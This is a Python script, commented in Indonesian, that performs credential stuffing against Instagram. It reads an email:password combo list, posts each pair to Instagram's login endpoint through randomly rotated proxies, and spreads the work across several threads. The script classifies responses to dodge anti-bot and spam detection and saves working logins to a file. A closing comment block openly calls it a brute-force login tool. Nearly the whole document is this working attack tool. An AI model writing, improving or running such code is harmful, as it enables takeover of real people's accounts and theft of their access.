import threading  # Modul untuk membuat thread
import requests  # Modul untuk membuat permintaan HTTP
from itertools import islice  # Fungsi untuk memotong iterator
import random  # Modul untuk operasi acak

runner = int(0) # inisialisasi penjalan
x = int(0) # inisialisasi x


def Redline(Run, listname, x, proxylist):
    # membuka daftar pasword
    passlist = open(listname, "r", encoding="utf8")
    while Run == True: # Loop selama berjalan bernilai True
        for line in islice(passlist, x, None): # Mengambil Bris Dari PassList
            ltemp = passlist.readline() # Membaca Satu Baris
            passlist.close() # Menutup File Daftar Baris
            break
        x = x + 1 # Increment X
        email = ltemp.partition(":")[0] # Mendapatkan Email
        passw = ltemp.partition(":")[2] # Mendapatkan Pasword
        passw = passw.rstrip() # Menghapus sepasi Di akhir Pasword
        # Membuka file daftar Proxy
        with open(proxylist) as f:
            lines = [line.rstrip('\n') for line in f]# Membaca Semua Baris Di Dalam Proxy
        rnd_line = random.choice(lines) # Memilih Satu Baris Acak Dari Daftar Proxy
        o = rnd_line[:-1] #Menghapus karakter terakhir dari baris yang di pilih
        proxzy = "https://" + o # Membuat url proxy
        proxz = {
            'https': proxzy,
        }
        if email == "" and passw == "": # Jika Email dan pasword kosong
            print("Akhir file tercapai. Keluar dari program...")
            Run = False # Set Run ke False untuk Keluar dari Loop
            # Url Paypload Untuk Perminntaan login Ke instagram
        url = "https://www.instagram.com/accounts/login/ajax/"
        payload = 'username={}&enc_password=%23PWD_INSTAGRAM_BROWSER%3A0%3A0%3A{}&queryParams=%7B%7D&optIntoOneTap=false'.format(email, passw)
        headers = {
            'authority': 'www.instagram.com',
            'x-ig-www-claim': 'hmac.AR08hbh0m_VdJjwWvyLFMaNo77YXgvW_0JtSSKgaLgDdUu9h',
            'x-instagram-ajax': '82a581bb9399',
            'content-type': 'application/x-www-form-urlencoded',
            'accept': '*/*',
            'user-agent': '',
            'x-requested-with': 'XMLHttpRequest',
            'x-csrftoken': 'rn3aR7phKDodUHWdDfCGlERA7Gmhes8X',
            'x-ig-app-id': '936619743392459',
            'origin': 'https://www.instagram.com',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://www.instagram.com/',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cookie': ''
        }
        # Mengirim Permitaan POST KE Instagram
        response = requests.request("POST", url, headers=headers, data=payload, proxies=proxz)
        response = response.text.encode('utf8') # Mengkodekan respons ke utf-8
        responseshrt = str(response[0:17]) # Mengambil Bagian Awal Dari Respons
        return email, passw, responseshrt, x, Run, proxzy # Mengembalikan Nilai


def PostRequest(email, passw, responseshrt, x, prozxy):
    # Inisisalisasi status ulang
    PostRequest.z = False
    # String yang di terima dalam respons
    Fixed = str(b'{"user": true, "u')
    FixedRetry = str(b'{"message": "chec')
    FixedError = str(b'{"message": "feed')
    FixedError2 = str(b'{"message": "Plea')
    Errorshrt = str(b'{"errors": {"erro')
    if responseshrt == Fixed:
        # Jika Respons menunjukan krendensial yang valid
        accounts = open("Accounts.txt", "a")
        accounts.write("{}:{}\n".format(email, passw)) # Menulis Kredensial Ke file
        print("Line {} berisi kredensial yang valid dan telah ditulis ke Accounts.txt".format(x))
        accounts.close()
    elif responseshrt == FixedRetry:
        # Jika Pesan menunjukan Kesalah (Instagram anti-bot)
        print("Line {} mengalami kesalahan (Instagram anti-bot) mencoba baris saat ini...".format(x))
        PostRequest.z = True
    elif responseshrt == FixedError or responseshrt == FixedError2:
        # Jika respons menunjukan deteksi spam
        print("Deteksi spam Instagram terpicu pada line {} mencoba ulang dan mencetak proxy yang digunakan".format(x))
        print(prozxy)
        PostRequest.z = True
    elif responseshrt == Errorshrt:
        # Jika respons menunjukan kesalah proxy
        print("Kesalahan Proxy Mencoba Ulang line {}".format(x))
        PostRequest.z = True
    else:
        # Jika respons Tidak Valid
        print("Line {} TIdak Berisi Kredensial yang Valid ".format(x))


# Menampilkan Informasi Program
print("\033[1;31m ____  __ __  ______  __ __    ___  ____   ____   ____    __  __ __    ___     __  __  _ \033[0m") # `1;` merah bold
print("\033[1;32m /    T|  T  T|      T|  T  T  /  _]|    \ l    j /    T  /  ]|  T  T  /  _]   /  ]|  l/ ]\033[0m") # `1;` hijau bold
print("\033[1;33mY  o  ||  |  ||      ||  l  | /  [_ |  _  Y |  T Y   __j /  / |  l  | /  [_   /  / |  ' / \033[0m") # `1;` kuning bold
print("\033[1;34m|     ||  |  |l_j  l_j|  _  |Y    _]|  |  | |  | |  T  |/  /  |  _  |Y    _] /  /  |    \ \033[0m") # `1;` biru bold
print("\033[1;35m|  _  ||  :  |  |  |  |  |  ||   [_ |  |  | |  | |  l_ /   \_ |  |  ||   [_ /   \_ |     Y\033[0m") # `1;` ungu bold
print("\033[1;36m|  |  |l     |  |  |  |  |  ||     T|  |  | j  l |     \     ||  |  ||     T\     ||  .  |\033[0m") # `1;` Cyan bold
print("\033[1;37ml__j__j \__,_j  l__j  l__j__jl_____jl__j__j|____jl___,_j\____jl__j__jl_____j \____jl__j\_j\033[0m") # `1;` Putih bold
print("\033[1;32m                                                                                          \033[0m") # `1;` merah bold

# Meminta input dari pengguna untuk nama file daftar user:pass dan daftar proxy
listname = input("Daftar nama user:pass list (Harus di Direktory yang sama dengan Skrip) Dengan .txt. Contohnya: DB.txt >")
proxylist = input("Daftar nama proxy list IP:PORT (Harus di Direktory yang sama dengan Skrip) Dengan .txt. Contohnya: Proxylist.txt >")

def Shredding(runner):
    global x
    if runner == 0:
        x = int(0)
    Run = True
    email, passw, responseshrt, x, Run, proxzy = Redline(Run, listname, x, proxylist)
    runner = runner + 1
    return email, passw, responseshrt, x, Run, runner, proxzy

# # Membuat thread untuk Shredding(runner)
Shreader1 = threading.Thread(target=Shredding, args=(runner,))
Shreader2 = threading.Thread(target=Shredding, args=(runner,))
Shreader3 = threading.Thread(target=Shredding, args=(runner,))
Shreader4 = threading.Thread(target=Shredding, args=(runner,))

y = int(0)
while True == True: # Loop tak terbatas
    if y == 0:
        # Memulai thread
        Shreader1.start()
        Shreader2.start()
        Shreader3.start()
        Shreader4.start()
        y = y + 1
        # menunggu Shredding(runner) selesai
    Shreader1.join()
    Shreader2.join()
    Shreader3.join()
    Shreader4.join()
    email, passw, responseshrt, x, Run, Runner, proxzy = Shredding(runner)
    PostRequest(email, passw, responseshrt, x, proxzy)
    if PostRequest.z == True:
        x = x - 1
    runner = runner + 1

# =====================================================================================================================================================================================================================================================================

# Secara keseluruhan, program ini dirancang untuk melakukan brute-force atau percobaan login otomatis ke akun Instagram menggunakan daftar yang berisi kombinasi email dan password.
# Berikut adalah ringkasan fungsionalitas utama program ini:

# 1. **Membaca File Input:**
#    - Program membaca dua file: satu berisi daftar kombinasi email dan password (`namadaftar`), dan satu berisi daftar proxy (`daftaproxy`).

# 2. **Threaded Execution:**
#    - Program menggunakan threading untuk memproses beberapa percobaan login secara bersamaan (multithreading). Ini memungkinkan untuk mengirim permintaan login secara paralel menggunakan proxy yang berbeda untuk setiap percobaan.

# 3. **Fungsi Utama:**
#    - **GarisMerah (`Redline`)**: Membaca baris demi baris dari daftar user:pass, memilih proxy secara acak dari daftar proxy, dan mengirimkan permintaan POST ke endpoint login Instagram untuk setiap kombinasi.
#    - **PermintaanPost (`PostRequest`)**: Memeriksa respon dari permintaan login. Jika login berhasil, kredensial disimpan ke dalam file. Jika terjadi kesalahan seperti deteksi bot atau proxy error, program mencetak pesan di konsol.

# 4. **Alur Kerja:**
#    - Program berulang kali membaca baris dari daftar user:pass menggunakan fungsi `Redline`, mengirimkan permintaan login menggunakan proxy yang dipilih secara acak, dan memeriksa respon menggunakan fungsi `PostRequest`.
#    - Jika respon menunjukkan bahwa kredensial valid, mereka dicatat ke dalam file "Akun.txt".
#    - Jika terjadi kesalahan dalam proses login (seperti deteksi bot oleh Instagram atau kesalahan proxy), program mencoba lagi atau mencetak pesan sesuai dengan jenis kesalahan yang terdeteksi.

# 5. **Output:**
#    - Program memberikan output di konsol yang memberi informasi tentang setiap langkah proses login, termasuk jika ada kredensial yang valid yang berhasil disimpan atau jika terjadi kesalahan.

# Secara singkat, program ini merupakan alat yang digunakan untuk mencoba masuk secara otomatis ke akun Instagram dengan menggunakan banyak kombinasi user:pass yang tersedia dalam file, dengan mengatur penggunaan proxy untuk menghindari deteksi dan pembatasan dari Instagram.